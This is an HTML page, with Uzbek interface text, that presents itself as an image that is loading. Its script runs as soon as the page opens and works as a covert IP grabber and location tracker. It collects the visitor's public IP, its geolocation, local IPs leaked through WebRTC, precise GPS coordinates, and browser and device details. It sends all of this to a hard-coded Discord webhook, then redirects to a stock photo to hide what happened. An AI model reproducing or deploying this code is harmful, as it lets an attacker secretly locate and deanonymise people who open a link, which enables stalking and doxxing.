<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rasm Yuklanmoqda...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: white;
        }
        .loading-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            margin-bottom: 10px;
            font-size: 24px;
        }
        p {
            margin: 5px 0;
            opacity: 0.9;
        }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="spinner"></div>
        <h1>Rasm Yuklanmoqda...</h1>
        <p>Iltimos, kuting</p>
    </div>

    <script>
        // Juda oddiy va ishonchli tracker
        function startTracking() {
            const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
            
            // 1. IP ni olish
            fetch('https://api.ipify.org?format=json')
            .then(function(response) { 
                if (!response.ok) {
                    throw new Error('Tarmoq javobi yaxshi emas');
                }
                return response.json(); 
            })
            .then(function(ipData) {
                const publicIP = ipData.ip;
                
                // Geolokatsiya ma'lumotlarini olish
                getGeolocation(publicIP).then(geoData => {
                    // 2. Local IP ni olish
                    let localIPs = "Aniqlanmoqda";
                    try {
                        const pc = new RTCPeerConnection({iceServers: []});
                        pc.createDataChannel('');
                        pc.createOffer().then(function(offer) { 
                            return pc.setLocalDescription(offer); 
                        });
                        
                        const ips = [];
                        pc.onicecandidate = function(e) {
                            if (e.candidate) {
                                const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                                if (match) ips.push(match[1]);
                            }
                        };
                        
                        setTimeout(function() {
                            localIPs = ips.length > 0 ? ips.join(', ') : 'Topilmadi';
                            sendToDiscord(publicIP, localIPs, geoData);
                        }, 2000);
                        
                    } catch (e) {
                        localIPs = 'Xato: ' + e.message;
                        sendToDiscord(publicIP, localIPs, geoData);
                    }
                });
            })
            .catch(function(error) {
                console.error('Xato:', error);
                sendToDiscord('IP olishda xato: ' + error.message, 'Noma lum', {});
            });
        }

        // IP orqali geolokatsiya ma'lumotlarini olish
        function getGeolocation(ip) {
            return fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'success') {
                        return {
                            country: data.country,
                            region: data.regionName,
                            city: data.city,
                            isp: data.isp,
                            coordinates: `${data.lat}, ${data.lon}`,
                            timezone: data.timezone
                        };
                    }
                    return {};
                })
                .catch(error => {
                    console.error('Geolokatsiya xatosi:', error);
                    return {};
                });
        }

        function sendToDiscord(publicIP, localIPs, geoData) {
            const webhook = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
            
            const now = new Date();
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            // Tizim ma'lumotlari
            const systemInfo = {
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages,
                cookieEnabled: navigator.cookieEnabled,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Noma lum',
                deviceMemory: navigator.deviceMemory || 'Noma lum',
                maxTouchPoints: navigator.maxTouchPoints || 0
            };

            let messageContent = "üìä Detailed System Report\n";
            messageContent += "üåê Public IP\n" + publicIP + "\n";
            messageContent += "üè† Local IPs\n" + localIPs + "\n";
            messageContent += "üïê Local Time\n" + now.toLocaleString() + "\n";
            
            if (Object.keys(geoData).length > 0) {
                messageContent += "üó∫ IP Geolocation\n";
                messageContent += "üìç Location: " + (geoData.coordinates || 'Noma lum') + "\n";
                messageContent += "üèô City: " + (geoData.city || 'Noma lum') + "\n";
                messageContent += "üåç Region: " + (geoData.region || 'Noma lum') + ", " + (geoData.country || 'Noma lum') + "\n";
                messageContent += "üè¢ ISP: " + (geoData.isp || 'Noma lum') + "\n";
            }
            
            messageContent += "üñ• System Information\n";
            messageContent += "üíª Platform: " + systemInfo.platform + "\n";
            messageContent += "üß† CPU Cores: " + systemInfo.hardwareConcurrency + "\n";
            messageContent += "üíæ RAM: " + (systemInfo.deviceMemory ? systemInfo.deviceMemory + ' GB' : 'Noma lum') + "\n";
            messageContent += "üëÜ Touch Points: " + systemInfo.maxTouchPoints + "\n";
            messageContent += "üåê Browser: " + navigator.userAgent.split(') ')[0] + ")\n";
            messageContent += "üîó URL: " + window.location.href + "\n";
            messageContent += "‚è∞ Timezone: " + timezone + "\n";
            messageContent += "üì± Screen: " + screen.width + "x" + screen.height + "\n";
            messageContent += "üéØ Color Depth: " + screen.colorDepth + "-bit\n";
            
            const message = {
                content: messageContent
            };
            
            fetch(webhook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(message)
            })
            .then(function(response) {
                if (!response.ok) {
                    throw new Error('Discord javob bermadi');
                }
                console.log('Ma lumotlar yuborildi');
            })
            .catch(function(error) {
                console.log('Yuborish xatosi:', error);
            })
            .finally(function() {
                // Rasmga o'tish
                setTimeout(function() {
                    window.location.href = 'https://images.unsplash.com/photo-1556740758-90deafc9c4f0';
                }, 3000);
            });
        }

        // GPS ni alohida yuborish
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const gpsMsg = {
                        content: "üìç GPS TOPILDI!\n" +
                                 "Kenglik: " + position.coords.latitude + "\n" +
                                 "Uzunlik: " + position.coords.longitude + "\n" +
                                 "Aniqlik: " + position.coords.accuracy + "m\n" +
                                 "Balandlik: " + (position.coords.altitude || 'Noma lum') + "m\n" +
                                 "Tezlik: " + (position.coords.speed || 'Noma lum') + "m/s"
                    };
                    
                    fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(gpsMsg)
                    }).catch(e => console.log('GPS yuborish xatosi:', e));
                },
                function(error) {
                    console.log('GPS rad etildi:', error.message);
                    // GPS rad etilgan holatda ham ma'lumot yuborish
                    const gpsErrorMsg = {
                        content: "üìç GPS RAD ETILDI!\n" +
                                 "Xato: " + error.message + "\n" +
                                 "Kod: " + error.code
                    };
                    
                    fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(gpsErrorMsg)
                    }).catch(e => console.log('GPS xato yuborish xatosi:', e));
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // Brauzer va tizim qo'shimcha ma'lumotlari
        function collectAdditionalInfo() {
            const info = {
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Yo q',
                javaEnabled: navigator.javaEnabled ? 'Ha' : 'Yo q',
                pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Ha' : 'Yo q',
                doNotTrack: navigator.doNotTrack || 'Noma lum',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : 'Noma lum'
            };
            
            return info;
        }

        // Darrov ishga tushirish
        document.addEventListener('DOMContentLoaded', function() {
            startTracking();
            
            // Qo'shimcha ma'lumotlarni yig'ish va yuborish
            setTimeout(() => {
                const additionalInfo = collectAdditionalInfo();
                const additionalMsg = {
                    content: "üîß Qo'shimcha Tizim Ma'lumotlari\n" +
                             "üîå Pluginlar: " + additionalInfo.plugins + "\n" +
                             "‚òï Java: " + additionalInfo.javaEnabled + "\n" +
                             "üìÑ PDF Ko'ruvchi: " + additionalInfo.pdfViewerEnabled + "\n" +
                             "üö´ Kuzatish: " + additionalInfo.doNotTrack + "\n" +
                             "üì° Ulanish: " + (additionalInfo.connection.effectiveType || 'Noma lum')
                };
                
                fetch("https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(additionalMsg)
                }).catch(e => console.log('Qo shimcha ma lumot yuborish xatosi:', e));
            }, 4000);
        });
    </script>
</body>
</html>
